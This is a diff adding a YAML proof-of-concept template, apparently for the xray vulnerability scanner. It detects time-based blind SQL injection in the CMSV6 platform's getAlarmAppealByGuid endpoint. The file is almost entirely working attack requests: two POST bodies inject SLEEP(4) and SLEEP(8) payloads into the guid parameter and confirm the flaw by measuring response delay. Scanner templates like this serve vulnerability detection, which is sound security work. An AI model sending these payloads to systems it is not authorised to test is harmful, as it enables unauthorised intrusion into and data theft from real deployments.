@@ -1,0 +1,31 @@
+name: poc-yaml-tongtianxingCMSV6-getAlarmAppealByGuid-sql
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /alarm_appeal/getAlarmAppealByGuid;downloadLogger.action
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: guid=1') AND (SELECT 3904 FROM (SELECT(SLEEP(4)))PITq) AND ('qhqF'='qhqF
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: POST
+      path: /alarm_appeal/getAlarmAppealByGuid;downloadLogger.action
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: guid=1') AND (SELECT 3904 FROM (SELECT(SLEEP(8)))PITq) AND ('qhqF'='qhqF
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486972&idx=1&sn=17035fc2befc8ffdbf61f31e04df6a6e&chksm=c267b8cff51031d95d0e04758f1270dfbe2d414449123ab27a6d30c1bbddc3d0237550ffb5c8&token=239710718&lang=zh_CN#rd
+
